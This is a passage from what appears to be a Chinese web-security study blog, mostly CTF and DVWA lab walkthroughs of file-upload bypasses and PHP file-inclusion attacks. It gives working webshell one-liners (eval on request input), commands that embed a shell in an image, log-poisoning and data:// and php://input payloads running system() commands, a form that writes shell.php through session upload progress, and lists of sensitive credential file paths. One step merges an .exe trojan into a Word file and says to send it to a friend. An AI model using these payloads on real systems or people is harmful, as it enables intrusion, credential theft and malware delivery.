，而<strong>ascii中0作为特殊字符保留</strong>，表示字符串结束，所以当url中出现%00时就会认为读取已结束。</p><p>‍</p><p>例如：</p><table><thead><tr><th align="center">URL</th><th align="center">输出内容</th></tr></thead><tbody><tr><td align="center"><a href="https://mp.csdn.net/upfiles/?filename=test.txt">https://mp.csdn.net/upfiles/?filename=test.txt</a></td><td align="center">此时输出的是：test.txt</td></tr><tr><td align="center">加上 <strong>%00</strong>后——&gt;&gt;</td><td align="center"></td></tr><tr><td align="center"><a href="https://mp.csdn.net/upfiles/?filename=test.php%00.txt">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a></td><td align="center">此时输出的是：test.php</td></tr></tbody></table><p>就绕过了后缀限制，可以上传webshell啦。</p><p>‍</p><p>利用示例：</p><h6 id="一、前端使用-00截断"><a href="#一、前端使用-00截断" class="headerlink" title="一、前端使用%00截断"></a>一、前端使用%00截断</h6><p>打开BurpSuite抓包工具，找到上传文件后缀名位置；</p><ul><li><p><strong>%00截断百分之百绕过前端校验；</strong> 例如：a.php%00.jpg</p><ol><li><p>在上传文件后缀名处，直接用 %00 就可以了。示例：a.php%00.jpg</p></li><li><p>某些情况下，直接在文件名中加 %00 进行截断不生效无法起到相应的作用，因为 %00 会以字符串的形式解析了。(不认为是空(NULL)字符，认为只是普通拼接的字符串)；</p></li><li><p>解决方法如下：</p><ol><li>是我们需要对 %00 做一个URL解码，也就是URL-decode；（在BurpSuite内选中%00右键convent selection——&gt;URL——&gt;URL-decode）</li><li>通过 burpsuite 修改 hex 值为 00 （URL decode）进行截断；</li></ol></li></ol></li><li><p>为什么两者用法不同？</p></li></ul><p>这是因为  <strong>%00 截断在 GET 中被 url 解码之后是空字符</strong>。但是<strong>在 POST 中 %00 不会被 url 解码</strong>，所以只能通过 burpsuite 修改 hex 值为 00 （URL decode）进行截断。</p><ul><li>如果是存在后端校验；%00截断只能绕过前端校验，达不到预想结果；</li></ul><p>‍</p><h6 id="二、后端使用-00路径截断"><a href="#二、后端使用-00路径截断" class="headerlink" title="二、后端使用%00路径截断"></a>二、后端使用%00路径截断</h6><p>（后端校验一般为后缀名，考虑%00截断文件路径）</p><p>参考：<a href="https://blog.csdn.net/weixin_44840696/article/details/90581104">文件上传绕过之00截断_00截断绕过-CSDN博客</a></p><p>‍</p><p>‍</p><h5 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h5><p>0x00是十六进制表示方法，表示ASCII码为0的字符，在一些函数处理时，会把这个字符当作结束符。</p><p> 0x00可以用在对文件名的绕过上</p><p>具体原理：系统在对文件名进行读取时，如果遇到0x00，就会认为读取已经结束。但要注意是文件的十六进制内容里的00，而不是文件名中的00。也就是说系统是按二进制或十六进制读取文件，遇到ASCII码为0的位置就停止，而这个ASCII码为0的位置在十六进制中是00。</p><p>总之就是利用ASCII码为0这个特殊字符，让系统认为字符串已经结束。</p><p>‍</p><h5 id="0x0a截断"><a href="#0x0a截断" class="headerlink" title="0x0a截断"></a>0x0a截断</h5><p> 0x0a是十六进制表示方法，表示ASCII码为&#x2F;n的换行字符，具体为换行至下一行行首起始位置。</p><p>‍</p><p>‍</p><h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p><strong>文件头检查</strong>是指当浏览器上传到服务器的时候，白名单进行的文件头检测，符合，则允许上传，否则不允许上传</p><p>‍</p><p><strong>常见文件头：</strong></p><p>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>XML (xml)，文件头：3C3F786D6C<br>ZIP Archive (zip)，文件头：504B0304</p><p>参考：<a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865">【CTF杂项】常见文件文件头文件尾格式总结及各类文件头_ctf常见文件头-CSDN博客</a></p><h3 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>文件头利用示例：</p><p>方法一：</p><p>先将一句话木马写入txt文件，改文件后缀为png格式；<br>用winhex打开，找到你所改成图片的文件头（例如我想改成的是png格式，也可以jpg等，png图片的格式头是89504E47），只要将其放在文件头部（也就是放在一句话的前面）,保存即可。<br>上传，用bp抓包，然后修改文件后缀为.php格式，放包即可，用蚁剑连接即可。</p><p>‍</p><p>方法二：</p><ol><li><p>准备一个要上传的图片；一个一句话木马.php</p></li><li><p>执行命令（命令行）：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">CSDN.png 为要上传的图片【必须加/b】；<br><br>1.php 为一句话木马【必须加/a】；<br><br>phpinfo 为重新定义的文件名；<br><br>copy CSDN.png/b+1.php/a phpinfo.png<br></code></pre></td></tr></table></figure></li><li><p>上传图片！</p></li><li><p>使用工具连接</p></li></ol><p>‍</p><p>方法三：</p><ol><li>BurpSuite抓包上传文件时，部分上传功能代码会展示文件流输出</li><li>直接在文件流的最前方，添加文件头（png格式文件头，jpg格式文件头）</li></ol><p>‍</p><p>方法四：</p><p>doc、pdf、excel文件头木马写入</p><ol><li><p>准备word文档.doc + .exe木马文件</p></li><li><p>执行命令</p><p> copy CSDN.doc&#x2F;b + 1.exe&#x2F;a phpinfo.doc</p></li><li><p>发送给朋友</p></li></ol><p>‍</p><h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>二次渲染产生的原因</p><ol><li>处于安全方面的考虑，不信任用户输入、上传的任何数据、图片；</li><li>因此，对于用户上传的图片等信息，都需要开发人员对图片文件重新生成！；</li><li>这就是防止图片中参杂恶意代码的防御措施；（即，对图片文件流，只保留可以生成图片的最基本部分，其他地方舍弃！）</li></ol><p>‍</p><p>二次渲染意义：</p><p>二次渲染过滤掉图片中掺杂的恶意代码</p><p>‍</p><h3 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h3><ol><li>下载经过二次渲染后的图片，使用010editor与原图进行比较</li><li>在与原图二进制相同的地方插入一句话木马，并上传</li><li>结合文件包含漏洞利用</li></ol><p>‍</p><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>代码逻辑出问题，采用先上传再检验</p><p><strong>先将文件上传到服务器中</strong>，<strong>再判断文件后缀是否在白名单里面</strong>。如果在则重命名，否则删除。</p><h3 id="绕过方法-5"><a href="#绕过方法-5" class="headerlink" title="绕过方法"></a>绕过方法</h3><ol><li><p>创建新的木马文件，其中代码为<code>&lt;?php fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);?&gt;</code>​</p><p> <img src="/assets/image-20240731195231-8ng4pqc.png" alt="image">​</p></li><li><p>首先刷新想要获取的木马文件路径 <strong>（请求页面）<a href="http://192.168.88.142:30010/upload/xiao.php">http://192.168.88.142:30010/upload/xiao.php</a></strong>。通过抓包抓取到请求页面，并将此数据包发送至Intruder，此时这个页面不要关闭</p><p> <img src="/assets/image-20240731195428-k4l08wt.png" alt="image">​</p></li><li><p>选中Payloads→Payloads Sets→Payload type:Null payloads（负载类型：空负载）</p><p> <img src="/assets/image-20240731195530-o4u1wiu.png" alt="image">​</p></li><li><p>Payload Options →Continue indefinitely（无限继续）,并start attack</p><p> <img src="/assets/image-20240731195604-9kvqfuk.png" alt="image">​</p></li><li><p>将设置好的木马文件上传，抓包并发送至Intruder，记得clear $同样设置无限发包</p><p> <img src="/assets/image-20240731195741-vk5ziaw.png" alt="image">​</p></li><li><p>此时不要放包，不断刷新访问<strong><a href="http://192.168.88.142:30010/upload/xiao.php%EF%BC%8C%E7%82%B9%E5%A4%9A%E5%87%A0%E6%AC%A1%E4%B9%8B%E5%90%8E%E5%86%8D%E6%94%BE%E5%8C%85%E6%9F%A5%E7%9C%8B">http://192.168.88.142:30010/upload/xiao.php，点多几次之后再放包查看</a></strong></p><p> <img src="/assets/image-20240731200749-4atd06b.png" alt="image">​</p></li></ol><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ol><li><p>上传文件是Web脚本语言时，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。</p></li><li><p>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；</p></li><li><p>上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</p></li><li><p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</p></li><li><p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</p><p> 除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块;或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过”本地文件包含漏洞(Local File Include)”执行此脚本;等等。</p></li></ol><h1 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h1><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><p>‍</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>文件上传漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含漏洞💼</title>
    <link href="/2024/03/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%F0%9F%92%BC/"/>
    <url>/2024/03/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%F0%9F%92%BC/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p><strong>漏洞原因：</strong><br>1、使用文件包含函数<br>2、包含的文件可控</p><p>‍</p><p>‍</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>‍</p><h2 id="文件包含常见函数"><a href="#文件包含常见函数" class="headerlink" title="文件包含常见函数"></a>文件包含常见函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require</span>()<span class="hljs-comment">#函数出现错误的时候，会直接报错并退出程序的执行</span><br><span class="hljs-keyword">require_once</span>()<span class="hljs-comment">#只包含一次</span><br><span class="hljs-keyword">include</span>()<span class="hljs-comment">#在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</span><br><span class="hljs-keyword">include_once</span>()<span class="hljs-comment">#只包含一次</span><br><span class="hljs-title function_ invoke__">highlight_file</span>()、<span class="hljs-title function_ invoke__">show_source</span>()<span class="hljs-comment">#函数对文件进行语法高亮显示，通常能看到源代码</span><br><span class="hljs-title function_ invoke__">readfile</span>()、<span class="hljs-title function_ invoke__">file_get_contents</span>()<span class="hljs-comment">#函数读取一个文件，并写入到输出</span><br><span class="hljs-title function_ invoke__">fopen</span>()<span class="hljs-comment">#打开一个文件或者url</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>三篇文章,包够的</p><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a></p><p><a href="https://xz.aliyun.com/t/5535?time__1311=n4+xnieWqDqGqY5KBKDsj3O4mOqj2hx8e7I=+Qx">浅析php文件包含及其getshell的姿势</a></p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121276653">文件包含漏洞+php伪协议_文件包含漏洞伪协议利用-CSDN博客</a></p><p><img src="/assets/image-20240803190856-0kglqv4.png" alt="image">​</p><p>‍</p><h2 id="日志文件权限"><a href="#日志文件权限" class="headerlink" title="日志文件权限"></a>日志文件权限</h2><p>在linux 下日志文件权限默认是 root 而php 的权限是 www-data 一般情况下都是读取不了，如果是 windows</p><p>环境下是可以权限是允许的。</p><p>linux 默认的 apache 日志文件路径是</p><ul><li><p>访问日志</p><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p></li><li><p>错误日志</p><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</p></li></ul><p>‍</p><h2 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h2><ol><li><h3 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">C:\boot.ini <span class="hljs-comment">//查看系统版本</span><br>C:\Windows\System32\inetsrv\MetaBase.xml <span class="hljs-comment">//IIS配置文件</span><br>C:\Windows\repair\sam <span class="hljs-comment">//存储系统初次安装的密码</span><br>C:\Program Files\mysql\my.ini <span class="hljs-comment">//Mysql配置</span><br>C:\Program Files\mysql\data\mysql\user.MYD <span class="hljs-comment">//Mysql root</span><br>C:\Windows\php.ini <span class="hljs-comment">//php配置信息</span><br>C:\Windows\my.ini <span class="hljs-comment">//Mysql配置信息</span><br></code></pre></td></tr></table></figure></li><li><h3 id="Linux-Unix系统"><a href="#Linux-Unix系统" class="headerlink" title="Linux&#x2F;Unix系统"></a>Linux&#x2F;Unix系统</h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">/root/.ssh/authorized_keys <span class="hljs-comment">//如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br>/root/.ssh/id_rsa <span class="hljs-comment">//ssh私钥,ssh公钥是id_rsa.pub</span><br>/root/.ssh/id_ras.keystore <span class="hljs-comment">//记录每个访问计算机用户的公钥</span><br>/root/.ssh/known_hosts<br><span class="hljs-comment">//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br>/etc/passwd <span class="hljs-comment">// 账户信息</span><br>/etc/shadow <span class="hljs-comment">// 账户密码文件</span><br>/etc/my.cnf <span class="hljs-comment">//mysql 配置文件</span><br>/etc/httpd/conf/httpd.conf <span class="hljs-comment">// Apache配置文件</span><br>/root/.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br>/root/.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br>/proc/<span class="hljs-built_in">self</span>/fd/fd[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]*(文件标识符)<br>/proc/mounts <span class="hljs-comment">//记录系统挂载设备</span><br>/porc/config.gz <span class="hljs-comment">//内核配置文件</span><br>/<span class="hljs-keyword">var</span>/lib/mlocate/mlocate.db <span class="hljs-comment">//全文件路径</span><br>/porc/<span class="hljs-built_in">self</span>/cmdline <span class="hljs-comment">//当前进程的cmdline参数</span><br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>‍</p><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><p>黑盒发现：主要观察参数传递的数据和文件名是否对应<br>URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼</p><p>思路:</p><p>1、配合文件上传（上传一个文件 文件写有我们的恶意代码）<br>2、无文件包含日志<br>3、无文件包含SESSION<br>4、无文件支持伪协议利用<br>​<code>php://input</code>​与<code>data://</code>​都需要开启<code>allow_url_include</code>​才能使用</p><p><img src="/assets/image-20240803103610-3irl60r.png" alt="image">​</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>思路:</p><p>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等</p><p>重要函数</p><ul><li><strong>PHP</strong>：<code>include</code>​、<code>require</code>​、<code>include_once</code>​、<code>require_once</code>​等<br>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行<br>require函数出现错误的时候，会直接报错并退出程序的执行</li><li><strong>Java</strong>：<code>java.io.File</code>​、<code>java.io.FileReader</code>​等</li><li><strong>ASP.NET</strong>：<code>System.IO.FileStream</code>​、<code>System.IO.StreamReader</code>​等</li></ul><p>‍</p><p>‍</p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><p>‍</p><h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含-LFI"></a>本地文件包含-LFI</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>简单复现：</p><p>创建include.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用include函数来包含<code>$_GET[&#39;file&#39;]</code>​，这是危险的做法，因为用户可以通过修改URL参数传递恶意文件路径，导致安全漏洞。</p><p>创建1.txt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php phpinfo();?&gt;<br></code></pre></td></tr></table></figure><p>访问对应文件路径，并传递参数</p><p><img src="/assets/image-20240802201302-yo9uqcs.png" alt="image">​</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>‍</p><h4 id="1、配合文件上传（上传一个文件-文件写有我们的恶意代码）"><a href="#1、配合文件上传（上传一个文件-文件写有我们的恶意代码）" class="headerlink" title="1、配合文件上传（上传一个文件 文件写有我们的恶意代码）"></a>1、配合文件上传（上传一个文件 文件写有我们的恶意代码）</h4><p>文件上传图片马</p><ol><li><p>这里选择使用dvwa靶场，Security Level等级为low，上传一个图片马，内容如下</p><p> <img src="/assets/image-20240415005028-f47r49p.png" alt="image">​</p></li><li><p>然后上传图片马，这里可以看到上传文件的路径<code>../../hackable/uploads/s.jpg</code>​</p><p> <img src="/assets/image-20240415004929-hteo1p1.png" alt="image">​</p></li><li><p>这里是dvwa文件包含漏洞页面</p><p> <img src="/assets/image-20240415003529-vrjse4t.png" alt="image">​</p></li><li><p>这里查看漏洞源码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure></li><li><p>这里没有做任何过滤，直接利用漏洞</p><p> <img src="/assets/image-20240415005145-qn41cdq.png" alt="image">​</p></li></ol><p>‍</p><h4 id="2、无文件包含日志"><a href="#2、无文件包含日志" class="headerlink" title="2、无文件包含日志"></a>2、无文件包含日志</h4><p>前提条件</p><ul><li><p>知道日志文件储存目录</p></li><li><p>日志文件可读</p></li></ul><p>使用<strong>日志记录文件包含，利用日志记录UA信息，UA带入代码</strong></p><p>1、使用文件读取：<code>file:///var/log/nginx/access.log</code>​ ，读取对应的日志文件内容（绝对路径），成功读取</p><p><img src="/assets/image-20240803171728-qhf4gw3.png" alt="image"><br>2、通过抓包，抓取到数据包，发送至repeater，并尝试修改UA头中的内容，修改成功</p><p><img src="/assets/image-20240803171753-ndx8cxv.png" alt="image">​</p><p>于是尝试在UA头中写入恶意代码：<br>​<code>User-Agent: 222222222&lt;?php system(&#39;ls&#39;)?&gt;</code>​并发送数据包，成功写入，并被解析fl0g.php index.php</p><p><img src="/assets/image-20240803171811-t0cj2rq.png" alt="image"><br>​<code>User-Agent: 333333333&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;</code>​并发送数据包，成功写入</p><p><img src="/assets/image-20240803171821-zg9gy6i.png" alt="image">​</p><p>‍</p><h4 id="3、无文件包含SESSION"><a href="#3、无文件包含SESSION" class="headerlink" title="3、无文件包含SESSION"></a>3、无文件包含SESSION</h4><p>前提条件</p><ul><li>找到Session内的可控变量</li><li>Session文件可读写，并且知道存储路径</li></ul><p><img src="/assets/image-20240803172037-z98gjoq.png" alt="image">​</p><p>确保以下配置项在 php.ini 文件中已启用</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure><p>1、在本地创建文件上传代码如下，并将<strong>上传URL更改为对应的靶场网址</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;目标网址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;?&gt;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2、运行创建的网址，并随意上传文件，通过burp抓包，并加入<code>Cookie: PHPSESSID=wusuowei</code>​，自定义Session ID</p><p><img src="/assets/image-20240803172323-cdt2bz3.png" alt="image">​</p><p>3、由于<code>session.upload_progress.cleanup</code>​是开启的，<strong>一旦读取了所有POST数据，就会清除进度信息</strong>于是我们需要条件竞争来读取文件，所谓条件竞争简单来说是<strong>在执行系统命令前先执行完自己的代码</strong>。</p><ol><li><p>将上传文件的数据包发送至Intruder，选择Clear$后Playloads→Playload type:Null payloads , Payload Options →Continue indefinitely（无限发送上传文件数据包）</p><p> <img src="/assets/image-20240803172517-5it91j6.png" alt="image">​</p><p> <img src="/assets/image-20240803172527-zs4g5sd.png" alt="image">​</p></li><li><p>将访问上传文件的请求数据包抓取并发送至Intruder，选择Clear$后Playloads→Playload type:Null payloads , Payload Options →Continue indefinitely（无限发送访问请求数据包）</p><p> <a href="http://8dc5c2cc-397c-46d6-a28d-3b202ca37b6a.challenge.ctf.show/?file%5C=/tmp/sess%5C_wusuowei">http://8dc5c2cc-397c-46d6-a28d-3b202ca37b6a.challenge.ctf.show/?file\=/tmp/sess\_wusuowei</a></p><p> <img src="/assets/image-20240803172556-85pkdlq.png" alt="image">​</p><p> <img src="/assets/image-20240803172606-5cc9vzz.png" alt="image"></p></li></ol><p>‍</p><h4 id="4、无文件支持伪协议利用"><a href="#4、无文件支持伪协议利用" class="headerlink" title="4、无文件支持伪协议利用"></a>4、无文件支持伪协议利用</h4><p>白盒利用-CTFSHOW-伪协议</p><ol><li><p>WEB—78—php-http协议</p><p> <img src="/assets/image-20240803164801-sl2l6bd.png" alt="image">​</p><p> 1、代码给出include文件包含的关键词</p><p> 2、由于是无文件上传，所以使用无文件支持伪协议利用</p><p> 3、两种方式：<br> 第一种</p><p> 直接通过文件读取 <strong>（相对路径）</strong>​<code>php://filter/read=convert.base64-encode/resource=flag.php</code>​<strong>读取名为flag.php的文件（当前网址存放源码目录下）</strong> ，并将其内容以base64编码的形式返回，并通过解密拿到flag。</p><p> <img src="/assets/image-20240803165048-ipu4evn.png" alt="image">​</p><p> 第二种</p><p> 使用文件执行<br> ​<code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code>​ 可以获取当前目录文件发现有一个flag.php<br> ​<code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code>​ 即可读取flag.php的中的内容。<br> <strong>system函数执行tac命令，该命令用于反向输出文件内容（以行为单位）。在这里，它尝试反向输出flag.php文件的内容。如果flag.php</strong>文件存在并可读，那么该文件的内容将被反向显示。</p><p> <img src="/assets/image-20240803165534-us6zmmw.png" alt="image">​</p><p> <img src="/assets/image-20240803165557-gq5gvou.png" alt="image">​</p></li><li><p>WEB—79—data-http协议</p><p> 与78相比对php关键词进行了过滤</p><p> 在PHP中，<code>&lt;?= ... ?&gt;</code>​ 是短标签（short tags）的一种形式，用于简洁地输出内容，等同于 <code>&lt;?php echo ... ?&gt;</code>​。而 <code>&lt;?php ... ?&gt;</code>​ 是标准的PHP起始和结束标记。<br> 两种方式：</p><p> 第一种</p><p> 将文件执行中，直接去掉php关键词，依旧可以正常执行<br> ​<code>?file=data://text/plain,&lt;?=system(&#39;ls&#39;);?&gt;;</code>​ 可以获取当前目录文件发现有一个flag.php</p><p> <img src="/assets/image-20240803170818-7b60wf7.png" alt="image"><br> ​<code>?file=data://text/plain,&lt;?=system(&#39;tac flag*&#39;);?&gt;</code>​ 即可读取flag.php的中的内容。成功获取到flag</p><p> 第二种<br> 使用文件执行，将数据流协议（data:&#x2F;&#x2F;）和base64编码的方式，将PHP代码嵌入URL中<br> ​<code>data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</code>​<br> 解码为：<code>&lt;?php system(&#39;tac flag.php&#39;); ?&gt;</code>​</p><p> <img src="/assets/image-20240803170855-t2xpwx6.png" alt="image">​</p><p> <img src="/assets/image-20240803170903-4w3zmdf.png" alt="image">​</p></li><li><p>WEB—80、81—日志包含</p><p> <img src="/assets/image-20240803171046-tjx1yul.png" alt="image">​</p><p> 1、代码给出include文件包含的关键词</p><p> 2、由于是无文件上传，所以使用无文件支持伪协议利用</p><p> 3、发现对与文件名做了php关键词和data关键词过滤</p><p> 4、两种方式：</p><p> 第一种</p><p> 使用文件执行<code>PHP://input</code>​，并使用短标签绕过其对php的过滤</p><p> <code>?file=PHP://input </code>​</p><p> <code>POST data：&lt;?=system(&#39;ls&#39;);?&gt;</code>​</p><p> <img src="/assets/image-20240803171435-e0xkiog.png" alt="image">​</p><p> 写上对应的去掉PHP关键词php语句即可</p><p> <code>?file=PHP://input POST data：&lt;?=system(&#39;tac fl0g.*&#39;);?&gt;</code>​中写上对应的去掉PHP关键词php语句，和文件匹配的后缀，更改为*号</p><p> 成功拿到flag</p><p> <img src="/assets/image-20240803171453-wmanb9h.png" alt="image">​</p><p> 第二种</p><p> 使用<strong>日志记录文件包含，利用日志记录UA信息，UA带入代码</strong></p><p> 1、使用文件读取：<code>file:///var/log/nginx/access.log</code>​ ，读取对应的日志文件内容（绝对路径），成功读取</p><p> <img src="/assets/image-20240803171728-qhf4gw3.png" alt="image"><br> 2、通过抓包，抓取到数据包，发送至repeater，并尝试修改UA头中的内容，修改成功</p><p> <img src="/assets/image-20240803171753-ndx8cxv.png" alt="image">​</p><p> 于是尝试在UA头中写入恶意代码：<br> 